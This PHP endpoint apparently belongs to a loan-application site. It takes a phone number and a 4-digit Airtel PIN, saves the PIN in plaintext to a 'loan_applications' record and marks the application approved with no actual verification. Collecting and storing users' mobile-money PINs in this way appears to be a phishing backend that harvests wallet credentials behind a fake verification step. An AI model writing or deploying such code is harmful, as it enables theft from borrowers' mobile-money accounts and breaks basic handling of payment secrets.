<?php
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');

try {
    // IMPORTANT: db.php must NOT echo or exit
    require_once __DIR__ . '/../config/db.php';

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['success' => false, 'error' => 'Method not allowed']);
        exit;
    }

    $raw = file_get_contents('php://input');
    if (!$raw) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Empty request body']);
        exit;
    }

    $data = json_decode($raw, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Invalid JSON payload']);
        exit;
    }

    $phone = trim($data['phone'] ?? '');
    $pin   = trim($data['pin'] ?? '');

    if ($phone === '' || $pin === '') {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Phone and PIN are required']);
        exit;
    }

    if (!preg_match('/^\d{4}$/', $pin)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'PIN must be exactly 4 digits']);
        exit;
    }

    // Find latest loan application
    $stmt = $pdo->prepare(
        'SELECT id FROM loan_applications 
         WHERE phone = :phone 
         ORDER BY created_at DESC 
         LIMIT 1'
    );
    $stmt->execute(['phone' => $phone]);
    $app = $stmt->fetch();

    if (!$app) {
        http_response_code(404);
        echo json_encode(['success' => false, 'error' => 'Loan application not found']);
        exit;
    }

    // Update verification
    $update = $pdo->prepare(
        'UPDATE loan_applications
         SET airtel_pin = :pin,
             airtel_confirmed = 1,
             status = "approved"
         WHERE id = :id'
    );

    $update->execute([
        'pin' => $pin,
        'id'  => $app['id']
    ]);

    echo json_encode([
        'success'  => true,
        'message'  => 'Airtel verification successful',
        'redirect' => 'success.html'
    ]);
    exit;

} catch (Throwable $e) {
    http_response_code(500);

    // NEVER expose internal errors in production
    error_log('[verify_airtel.php] ' . $e->getMessage());

    echo json_encode([
        'success' => false,
        'error'   => 'Server error'
    ]);
    exit;
}
